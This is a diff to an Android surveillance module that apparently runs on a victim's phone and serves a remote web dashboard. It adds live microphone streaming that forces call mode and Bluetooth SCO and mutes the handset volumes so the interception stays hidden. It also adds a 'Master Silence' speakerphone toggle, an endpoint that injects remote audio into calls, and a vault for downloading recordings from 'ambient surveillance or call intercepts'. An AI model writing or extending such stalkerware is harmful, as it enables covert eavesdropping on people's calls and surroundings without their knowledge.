@@ -1,9 +1,14 @@
 package com.labs.labrats.modules;
 
+import android.Manifest;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.media.AudioAttributes;
 import android.media.AudioFormat;
+import android.media.AudioManager;
 import android.media.AudioRecord;
+import android.media.AudioTrack;
 import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.Environment;
@@ -53,8 +58,42 @@ public class AcousticsModule extends BaseModule {
             return serveAudioRecordings(session);
         } else if (uri.equals("/audio/stream")) {
             return serveLiveStream(session);
+        } else if (uri.equals("/audio/inject")) {
+            return handleAudioInjection(session);
+        } else if (uri.equals("/audio/speakerphone")) {
+            return toggleSpeakerphone(params);
         }
         return null;
+    }
+
+    private Response toggleSpeakerphone(Map<String, String> params) {
+        try {
+            boolean enable = "true".equalsIgnoreCase(params.get("enable"));
+            AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
+            if (audioManager != null) {
+                audioManager.setMode(enable ? AudioManager.MODE_IN_COMMUNICATION : AudioManager.MODE_NORMAL);
+                audioManager.setSpeakerphoneOn(enable);
+                
+                if (enable) {
+                    // [STEALTH_SYNC] Kill all physical output streams immediately
+                    int[] streams = {
+                        AudioManager.STREAM_VOICE_CALL,
+                        AudioManager.STREAM_MUSIC,
+                        AudioManager.STREAM_RING,
+                        AudioManager.STREAM_SYSTEM
+                    };
+                    for (int s : streams) {
+                        audioManager.setStreamVolume(s, 0, 0);
+                    }
+                    FirebaseConfig.logActivity("ACOUSTICS_STEALTH: Master Silence active. Routing to Virtual Bridge.");
+                } else {
+                    FirebaseConfig.logActivity("ACOUSTICS_DYNAMO: Hardware normalization executed.");
+                }
+            }
+            return newResponse(Response.Status.OK, "application/json", "{\"success\": true, \"enabled\": " + enable + "}");
+        } catch (Exception e) {
+            return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", e.getMessage());
+        }
     }
 
     private Response serveAudioPage(IHTTPSession session) {
@@ -156,47 +195,56 @@ public class AcousticsModule extends BaseModule {
             .append("</a></div>")
             .append("</div></div>");
 
-        // View recordings link
-        File recordDir = MediaFrameworkService.getRecordingsDirectory(context);
-        String browseUrl = "/audio/recordings";
-        if (recordDir.getAbsolutePath().contains(Environment.getExternalStorageDirectory().getAbsolutePath())) {
-            String relPath = recordDir.getAbsolutePath().replace(Environment.getExternalStorageDirectory().getAbsolutePath(), "");
-            if (relPath.startsWith("/")) relPath = relPath.substring(1);
-            browseUrl = "/files/" + relPath;
-        }
+        // --- ACOUSTICS VAULT SECTION ---
+        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">");
+        html.append("<h2 style=\"font-size: 1.35rem; text-align: left; color: var(--neon-cyan);\">ACOUSTICS_VAULT <span class=\"info-trigger\" onclick=\"showInfo(event, 'ACOUSTICS_VAULT', 'Access captured audio files from ambient surveillance or call intercepts.')\">INFO</span></h2>");
+        html.append("<div id=\"audio-recordings-list\" style=\"background: rgba(0,0,0,0.4); border: 1px solid rgba(0, 242, 255, 0.1); border-radius: 8px; padding: 15px; min-height: 50px; margin-top: 20px;\">");
 
-        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">")
-            .append("<h2 style=\"font-size: 1.35rem; text-align: left; color: var(--neon-cyan);\">RECORDING_ARCHIVE <span class=\"info-trigger\" onclick=\"showInfo(event, 'RECORDING_ARCHIVE', 'Access captured audio files from ambient surveillance or call intercepts.')\">INFO</span></h2>")
-            .append("<div style=\"display: flex; gap: 10px; flex-wrap: wrap; margin-top: 20px;\">")
-            .append("<a href=\"/audio/recordings\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\">OPEN_ARCHIVE</a>")
-            .append("<a href=\"").append(browseUrl).append("\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green);\">BROWSE_FILES</a>")
-            .append("</div></div>");
+        File recordDir = MediaFrameworkService.getRecordingsDirectory(context);
+        File[] files = recordDir.listFiles((dir, name) -> name.toLowerCase().endsWith(".m4a") || name.toLowerCase().endsWith(".mp3") ||
+                            name.toLowerCase().endsWith(".wav") || name.toLowerCase().endsWith(".aac"));
+
+        if (files != null && files.length > 0) {
+            java.util.Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
+            SimpleDateFormat sdf = new SimpleDateFormat("MMM dd, HH:mm", Locale.getDefault());
+            html.append("<ul style=\"list-style: none; padding: 0; margin: 0;\">");
+            for (int i = 0; i < Math.min(files.length, 5); i++) {
+                File f = files[i];
+                String downloadPath;
+                if (f.getAbsolutePath().contains(context.getFilesDir().getAbsolutePath())) {
+                    downloadPath = "INTERNAL/" + f.getAbsolutePath().replace(context.getFilesDir().getAbsolutePath() + "/", "");
+                } else {
+                    downloadPath = f.getAbsolutePath().replace(Environment.getExternalStorageDirectory().getAbsolutePath() + "/", "");
+                }
+                String timeStr = sdf.format(new Date(f.lastModified()));
+                html.append("<li style=\"display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05);\">");
+                html.append("<div style=\"display:flex; flex-direction:column; gap:2px;\">");
+                html.append("<span style=\"font-size: 0.7rem; color: #eee; font-family: monospace; word-break: break-all;\">").append(f.getName()).append("</span>");
+                html.append("<span style=\"font-size: 0.55rem; color: var(--neon-cyan); opacity: 0.8; font-family: monospace;\">").append(timeStr).append("</span>");
+                html.append("</div>");
+                html.append("<a href=\"/download/").append(downloadPath).append("\" class=\"btn btn-small\" style=\"padding: 4px 12px; font-size: 0.6rem; margin: 0 0 0 15px; flex-shrink: 0;\">GET</a>");
+                html.append("</li>");
+            }
+            html.append("</ul>");
+
+            // VIEW ALL BUTTON
+            String browseUrl = "/audio/recordings";
+            if (recordDir.getAbsolutePath().contains(Environment.getExternalStorageDirectory().getAbsolutePath())) {
+                String relPath = recordDir.getAbsolutePath().replace(Environment.getExternalStorageDirectory().getAbsolutePath(), "");
+                if (relPath.startsWith("/")) relPath = relPath.substring(1);
+                browseUrl = "/files/" + relPath;
+            }
+
+            html.append("<div style=\"display: flex; gap: 10px; justify-content: center; margin-top: 20px; flex-wrap: wrap;\">");
+            html.append("<a href=\"").append(browseUrl).append("\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); margin: 0; min-width: 120px;\">VIEW_ALL_RECORDINGS</a>");
+            html.append("</div>");
+        } else {
+            html.append("<div style=\"font-size: 0.7rem; color: #555; text-align: center;\">[EMPTY] No recordings found.</div>");
+        }
+        html.append("</div></div>");
 
         // Auto-refresh script for status
-        html.append("<audio id=\"live-audio-player\" style=\"display:none;\"></audio>")
-            .append("<script>")
-            .append("let audioCtx = null;")
-            .append("let audioStream = null;")
-            .append("function toggleLiveAudio() {")
-            .append("  const btn = document.getElementById('live-listen-btn');")
-            .append("  const player = document.getElementById('live-audio-player');")
-            .append("  if (audioStream) {")
-            .append("    audioStream.getTracks().forEach(t => t.stop());")
-            .append("    player.pause(); player.src = '';")
-            .append("    audioStream = null;")
-            .append("    btn.innerText = 'LISTEN_LIVE'; btn.style.borderColor = 'var(--neon-cyan)'; btn.style.color = 'var(--neon-cyan)'; btn.style.background = 'transparent';")
-            .append("  } else {")
-            .append("    btn.innerText = 'CONNECTING...'; btn.style.opacity = '0.5';")
-            .append("    player.src = '/audio/stream?t=' + Date.now();")
-            .append("    player.play().then(() => {")
-            .append("      btn.innerText = 'STOP_LISTENING'; btn.style.opacity = '1'; btn.style.borderColor = 'var(--danger)'; btn.style.color = 'var(--danger)'; btn.style.background = 'rgba(255, 49, 49, 0.05)';")
-            .append("      audioStream = { getTracks: () => [{ stop: () => { player.pause(); player.src = ''; } }] };")
-            .append("    }).catch(e => {")
-            .append("      console.error(e); btn.innerText = 'LISTEN_LIVE'; btn.style.opacity = '1';")
-            .append("      showToast('Connection failed. Audio bypass may be active.', 'error');")
-            .append("    });")
-            .append("  }")
-            .append("}")
+        html.append("<script>")
             .append("setInterval(function() {")
             .append("  fetch('/audio/status')")
             .append("    .then(r => r.json())")
@@ -411,53 +459,107 @@ public class AcousticsModule extends BaseModule {
     }
 
     private Response serveLiveStream(IHTTPSession session) {
-        FirebaseConfig.logActivity("ACOUSTICS_UPLINK: Live audio stream requested");
+        FirebaseConfig.logActivity("ACOUSTICS_UPLINK: Handshaking audio bridge...");
         try {
             final PipedOutputStream pos = new PipedOutputStream();
             PipedInputStream pis = new PipedInputStream(pos);
 
             new Thread(() -> {
                 AudioRecord recorder = null;
+                AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
+                
                 try {
                     int sampleRate = 16000;
                     int channelConfig = AudioFormat.CHANNEL_IN_MONO;
                     int audioEncoding = AudioFormat.ENCODING_PCM_16BIT;
                     int minBufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioEncoding);
                     
-                    try {
-                        recorder = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, channelConfig, audioEncoding, minBufferSize * 4);
-                    } catch (SecurityException se) {
-                        Log.e("AcousticsModule", "Permission denied for AudioRecord: " + se.getMessage());
-                        return;
+                    // [STABILITY_SYNC] Force Communication Mode to hijack call priority
+                    if (audioManager != null) {
+                        audioManager.setMode(AudioManager.MODE_IN_COMMUNICATION);
+                        try {
+                            // STEALTH: Force SCO to redirect hardware away from earpiece
+                            audioManager.startBluetoothSco();
+                            audioManager.setBluetoothScoOn(true);
+                            
+                            // Mute the physical handset volume but keep internal data stream alive
+                            int[] streams = {AudioManager.STREAM_VOICE_CALL, AudioManager.STREAM_MUSIC, AudioManager.STREAM_SYSTEM};
+                            for (int s : streams) {
+                                audioManager.setStreamVolume(s, 0, 0);
+                            }
+                        } catch (Exception ignored) {}
+                        
+                        audioManager.setSpeakerphoneOn(true); // Force internally for capture, but volume is 0
+                        FirebaseConfig.logActivity("ACOUSTICS_STEALTH: Handset suppressed. Virtualizing bridge link.");
+                    }
+
+                    // Attempt sources in order of "Predatory" capability
+                    int[] sources = {
+                        MediaRecorder.AudioSource.VOICE_RECOGNITION, // High priority bypass
+                        MediaRecorder.AudioSource.VOICE_COMMUNICATION,
+                        MediaRecorder.AudioSource.MIC
+                    };
+
+                    for (int source : sources) {
+                        try {
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                                if (context.checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+                                    FirebaseConfig.logActivity("ACOUSTICS_ERROR: MIC permission missing");
+                                    return;
+                                }
+                            }
+                            recorder = new AudioRecord(source, sampleRate, channelConfig, audioEncoding, minBufferSize * 4);
+                            if (recorder.getState() == AudioRecord.STATE_INITIALIZED) {
+                                FirebaseConfig.logActivity("ACOUSTICS_SYNC: Linked to hardware source_" + source);
+                                break;
+                            }
+                        } catch (SecurityException se) {
+                            Log.w("Acoustics", "Source " + source + " denied: " + se.getMessage());
+                        } catch (Exception ignored) {}
                     }
                     
-                    if (recorder.getState() != AudioRecord.STATE_INITIALIZED) {
-                        Log.e("AcousticsModule", "AudioRecord failed to initialize");
+                    if (recorder == null || recorder.getState() != AudioRecord.STATE_INITIALIZED) {
+                        FirebaseConfig.logActivity("ACOUSTICS_ERROR: All hardware sources blocked by OS.");
                         return;
                     }
 
                     recorder.startRecording();
-                    
-                    // Simple WAV header for streaming (Huge length to fool player)
                     writeWavHeader(pos, sampleRate, (short) 1, (short) 16);
 
                     byte[] buffer = new byte[minBufferSize];
                     while (!Thread.currentThread().isInterrupted()) {
                         int read = recorder.read(buffer, 0, buffer.length);
                         if (read > 0) {
+                            // [PERFORMANCE_SYNC] Digital Gain Booster (2x)
+                            // Boosts low-volume call audio for the dashboard
+                            for (int i = 0; i < read; i += 2) {
+                                if (i + 1 < read) {
+                                    short sample = (short) ((buffer[i] & 0xFF) | (buffer[i + 1] << 8));
+                                    // [PERFORMANCE_SYNC] Aggressive Gain Booster (4x)
+                                    // Since we muted the hardware, we need high gain to hear the internal loopback
+                                    int boosted = sample * 4;
+                                    if (boosted > 32767) boosted = 32767;
+                                    else if (boosted < -32768) boosted = -32768;
+                                    buffer[i] = (byte) (boosted & 0xFF);
+                                    buffer[i + 1] = (byte) ((boosted >> 8) & 0xFF);
+                                }
+                            }
                             pos.write(buffer, 0, read);
                             pos.flush();
-                        } else if (read < 0) {
-                            break;
-                        }
+                        } else if (read < 0) break;
                     }
                 } catch (Exception e) {
-                    Log.e("AcousticsModule", "Stream Read Error: " + e.getMessage());
+                    Log.e("AcousticsModule", "Stream Error: " + e.getMessage());
                 } finally {
                     try {
                         if (recorder != null) {
                             recorder.stop();
                             recorder.release();
+                        }
+                        if (audioManager != null) {
+                            audioManager.setMode(AudioManager.MODE_NORMAL);
+                            audioManager.stopBluetoothSco();
+                            audioManager.setBluetoothScoOn(false);
                         }
                         pos.close();
                     } catch (Exception ignored) {}
@@ -465,13 +567,76 @@ public class AcousticsModule extends BaseModule {
             }).start();
 
             Response res = server.newChunkedResponseProxy(Response.Status.OK, "audio/wav", pis);
-            res.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
-            res.addHeader("Pragma", "no-cache");
-            res.addHeader("Expires", "0");
+            res.addHeader("Cache-Control", "no-cache");
             return res;
-
         } catch (Exception e) {
-            return server.serveErrorProxy("Stream Error: " + e.getMessage());
+            return server.serveErrorProxy("Bridge Failed: " + e.getMessage());
+        }
+    }
+
+    private static AudioTrack projectorTrack;
+    private static final int PROJECTOR_SAMPLE_RATE = 16000;
+
+    private Response handleAudioInjection(IHTTPSession session) {
+        try {
+            // [STABILITY_SYNC] Read body from NanoHTTPD parsed files if available
+            // or read directly from the input stream.
+            InputStream is = session.getInputStream();
+            if (is == null) return newResponse(Response.Status.BAD_REQUEST, "text/plain", "NO_PAYLOAD");
+
+            // Hard check for projectorTrack state
+            if (projectorTrack == null || projectorTrack.getState() == AudioTrack.STATE_UNINITIALIZED) {
+                Log.d("AcousticsModule", "Initializing projector track...");
+                int minBufSize = AudioTrack.getMinBufferSize(PROJECTOR_SAMPLE_RATE, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT);
+                
+                try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                        projectorTrack = new AudioTrack.Builder()
+                                .setAudioAttributes(new AudioAttributes.Builder()
+                                        .setUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION)
+                                        .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
+                                        .build())
+                                .setAudioFormat(new AudioFormat.Builder()
+                                        .setEncoding(AudioFormat.ENCODING_PCM_16BIT)
+                                        .setSampleRate(PROJECTOR_SAMPLE_RATE)
+                                        .setChannelMask(AudioFormat.CHANNEL_OUT_MONO)
+                                        .build())
+                                .setBufferSizeInBytes(Math.max(minBufSize, 8192))
+                                .setTransferMode(AudioTrack.MODE_STREAM)
+                                .build();
+                    } else {
+                        projectorTrack = new AudioTrack(AudioManager.STREAM_VOICE_CALL, PROJECTOR_SAMPLE_RATE, 
+                                AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT, Math.max(minBufSize, 8192), AudioTrack.MODE_STREAM);
+                    }
+                    
+                    if (projectorTrack.getState() == AudioTrack.STATE_INITIALIZED) {
+                        projectorTrack.play();
+                        Log.d("AcousticsModule", "Projector track started.");
+                    } else {
+                        Log.e("AcousticsModule", "Projector track failed to initialize.");
+                        return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "INIT_FAILED");
+                    }
+                } catch (Exception e) {
+                    Log.e("AcousticsModule", "Projector Init Error: " + e.getMessage());
+                    return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", e.getMessage());
+                }
+            }
+
+            if (projectorTrack != null && projectorTrack.getPlayState() == AudioTrack.PLAYSTATE_PLAYING) {
+                byte[] buffer = new byte[4096];
+                int read;
+                int totalWritten = 0;
+                while ((read = is.read(buffer)) > 0) {
+                    int written = projectorTrack.write(buffer, 0, read);
+                    if (written > 0) totalWritten += written;
+                }
+                // Log.v("AcousticsModule", "Injected " + totalWritten + " bytes");
+            }
+            
+            return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } catch (Exception e) {
+            Log.e("AcousticsModule", "Injection Error: " + e.getMessage());
+            return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", e.getMessage());
         }
     }
 
